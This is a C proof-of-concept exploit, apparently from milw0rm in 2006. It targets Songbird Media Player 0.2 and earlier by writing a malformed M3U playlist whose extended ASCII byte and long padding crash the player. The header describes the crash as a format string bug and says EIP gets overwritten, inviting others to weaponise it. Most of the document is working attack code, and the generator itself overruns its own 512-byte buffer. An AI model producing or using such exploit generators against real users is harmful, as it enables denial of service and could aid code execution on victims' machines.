/*
========================================================================
0-day Songbird Media Player <= 0.2 Format String Denial Of Service PoC
========================================================================
Songbird Media Player and lower experiance a format string conversion error
when attempting to parse out malformed M3U Playlist files in which extended
ascii exists in any field.

The problem seems to originate in the unicode coverter which kicks into
effect when extended ascii is present in a M3U file.  It can even cause
a huge spike in CPU Resources, a few times mine flatlined at 99% after exploit
and required a system reboot.

I don't have the time to try to turn this into an exploit, but i've seen
it overwrite EIP with some values - the string is getting converted to unicode
prior to the error.  And sometimes EIP gets randomly overwritten with values,
and sometimes the application just crashes.

For me using this exploit EIP gets overwritten with 0x35382534 = "58%4"
sometimes its 0x3f3f3f3f and sometimes its 0xfffffff3.

I noticed removing a file extension from the exploit causes EIP to get
overwriten
more frequently.

Im sure someone will turn this into an exploit, just credit me with my name and
email address in the exploit, I'll be more than happy.


Happy Hunting and Happy Holidays to everyone

<insert super awesome leet ascii art here>

November 2006 - Month Of Greg's Media Player Exploits :)
(i'll probably continue it into December)

Discovered and Reported By: Greg Linares GLinares.code@gmail.com
Reported Exploit Date: 11/28/2006

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[])
{

       FILE *Exploit;
       char buffer[512];

       int x;

       printf("\n======================================================================\n");
       printf("0-day Songbird Media Player <= 0.2 Format String Denial Of Service PoC \n");
       printf("Crashes Songbird Player sometimes consumes 99%% CPU and needs reboot \n");
       printf("Discovered and Coded By: Greg Linares <GLinares.code[at]gmail[dot]com>\n");
       printf("Usage: %s <output M3U file>\n", argv[0]);
       printf("====================================================================\n\n\n");


       if (argc < 2) {
               printf("Invalid Number Of Arguments\n");
               return 1;
       }


       Exploit = fopen(argv[1],"w");
   if ( !Exploit )
   {
       printf("\nCouldn't Open File!");
       return 1;
   }

       memset(buffer, 0, 512);

       for (x=0;x<512;x++) {
               strcat(buffer, "A");
       }




	/* I havent played around with much extended ascii but i do know \xb5 - \xbf work */

       /* Vulgar Fractions Scare Me Too */

       fputs("#EXTM3U\r\n#EXTINF:0,0_day_Songbird_Format_String_PoC_by_Greg_Linares\xbc", Exploit);
       fputs(buffer, Exploit);
       fputs(buffer, Exploit);
       fputs("\r\nC:\\", Exploit);
       fputs(buffer, Exploit);
       /*
       This works as well here but sometimes EIP doesnt get overwritten and the application just crashes.

       fputs(".mp3\r\n", Exploit);
       fputs("C:\\RANDOMFILENAMEHERE\xbc\xbx\xbc\xbc", Exploit);
       fputs(buffer, Exploit);
       fputs(".mp3\r\n", Exploit);
       */


       printf("Exploit Succeeded...\n Output File: %s\n\n", argv[1]);


       printf("Questions, Comments, Feedback --> Greg Linares (GLinares.code[at]gmail[dot]com)\n");

       fclose(Exploit);
       return 0;
}

// milw0rm.com [2006-11-28]
